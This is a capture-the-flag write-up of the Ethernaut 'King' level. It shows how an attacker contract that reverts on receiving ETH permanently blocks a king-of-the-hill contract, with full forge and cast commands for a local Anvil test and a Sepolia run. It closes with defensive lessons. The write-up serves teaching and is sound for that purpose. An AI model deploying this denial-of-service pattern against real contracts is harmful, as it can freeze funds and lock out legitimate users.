# Ethernaut Challenge 09 — King

The contract below represents a very simple game: whoever sends an amount of ETH greater than the current prize becomes the new king.  

When a new king is set, the previous king receives the prize.

Such a fun game. Your goal is to **break it**.

When you submit the instance back to the level, the level will try to reclaim kingship.  
You beat the level if you can prevent this.

Instance address:

```
0x6A2CA55902D70aA546C04b8bfE0ac3212f95D64a
```

---

## 🧠 Understanding the contract

Let's check the main variables: king, prize, owner

```bash
cast call 0x6A2CA55902D70aA546C04b8bfE0ac3212f95D64a \
    "_king()" \
    --rpc-url $SEPOLIA_RPC_URL
```

```
0x0000000000000000000000003049c00639e6dfc269ed1451764a046f7ae500c6
```

This is the level contract address.

---

### Prize

```bash
cast call 0x6A2CA55902D70aA546C04b8bfE0ac3212f95D64a \
    "prize()" \
    --rpc-url $SEPOLIA_RPC_URL
```

```
0x00000000000000000000000000000000000000000000000000038d7ea4c68000
```

Convert to decimal:

```bash
cast --to-dec 0x00000000000000000000000000000000000000000000000000038d7ea4c68000
```

```
1000000000000000
```

Convert to ether:

```bash
cast --from-wei 1000000000000000
```

```
0.001000000000000000
```

---

### Owner

```bash
cast call 0x6A2CA55902D70aA546C04b8bfE0ac3212f95D64a \
    "owner()" \
    --rpc-url $SEPOLIA_RPC_URL
```

```
0x0000000000000000000000003049c00639e6dfc269ed1451764a046f7ae500c6
```

So `owner` and `king` are the same (the deployer).

---

## 🧪 Local test on Anvil

Deploy the King contract:

```bash
forge create src/challenge-09-king/King.sol:King \
  --value 0.001ether \
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 \
  --broadcast
```

King contract deployed to:

```
0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0
```

Check balance:

```bash
cast balance 0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0 \
    --rpc-url http://127.0.0.1:8545 \
    --ether
```

```
0.001000000000000000
```

Check king:

```bash
cast call 0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0 \
    "_king()" \
    --rpc-url http://127.0.0.1:8545
```

Check owner:

```bash
cast call 0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0 \
    "owner()" \
    --rpc-url http://127.0.0.1:8545
```

---

## 🧨 Exploit idea

The vulnerability is here:

```solidity
payable(king).transfer(msg.value);
```

When a new king is set:
- the contract sends ETH to the current king
- then updates the king

👉 If the transfer fails, the entire transaction reverts

So if the current king is a contract that **rejects ETH**, no one can replace it.

---

## 🧪 Attack

Deploy `KingAttacker`:

```bash
forge create src/challenge-09-king/KingAttacker.sol:KingAttacker \
  --rpc-url http://127.0.0.1:8545 \
  --private-key 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d \
  --broadcast \
  --constructor-args 0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0
```

KingAttacker deployed at:

```
0xbCF26943C0197d2eE0E5D05c716Be60cc2761508
```

Call `changeKing`:

```bash
cast send 0xbCF26943C0197d2eE0E5D05c716Be60cc2761508 \
    "changeKing()" \
    --value 0.001ether \
    --rpc-url http://127.0.0.1:8545 \
    --private-key 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d
```

Check the new king:

```bash
cast call 0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0 \
    "_king()" \
    --rpc-url http://127.0.0.1:8545
```

Now the king is the attacker contract.

---

## ❌ Why the contract is now broken

Try to dethrone the attacker:

```bash
cast send 0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0 \
    --value 0.001ether \
    --rpc-url http://127.0.0.1:8545 \
    --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
```

This fails because:

```solidity
receive() external payable {
    revert KingAttacker_LockedForever();
}
```

- The King contract tries to send ETH to the attacker
- The attacker reverts
- The whole transaction reverts

👉 The king can no longer be changed

---

## 🚀 Execute on Sepolia

Deploy attacker:

```bash
forge create src/challenge-09-king/KingAttacker.sol:KingAttacker \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut \
  --broadcast \
  --constructor-args 0x6A2CA55902D70aA546C04b8bfE0ac3212f95D64a
```

Contract `KingAttacker` deployed to: 

```
0x13fB4E48a26A4e8F30614D6645859Db82efeCc28
```

Call `changeKing`:

```bash
cast send 0x13fB4E48a26A4e8F30614D6645859Db82efeCc28 \
    "changeKing()" \
    --value 0.001ether \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

Check the king:

```bash
cast call 0x6A2CA55902D70aA546C04b8bfE0ac3212f95D64a \
    "_king()" \
    --rpc-url $SEPOLIA_RPC_URL
```

```
0x00000000000000000000000013fb4e48a26a4e8f30614d6645859db82efecc28
```

---

## ✅ Conclusion

The king is now the attacker contract.

Since it **cannot receive ETH**, no one can replace it.

The level contract cannot reclaim kingship.

Challenge completed.

---

## 🛡️ Security takeaway

This challenge highlights a classic **denial-of-service (DoS)** vulnerability caused by external calls.

Key lessons:

- Never rely on `.transfer()` or `.send()` for critical logic
- External calls can fail and break your contract
- Avoid making state changes dependent on ETH transfers
- Prefer the **pull over push payment pattern**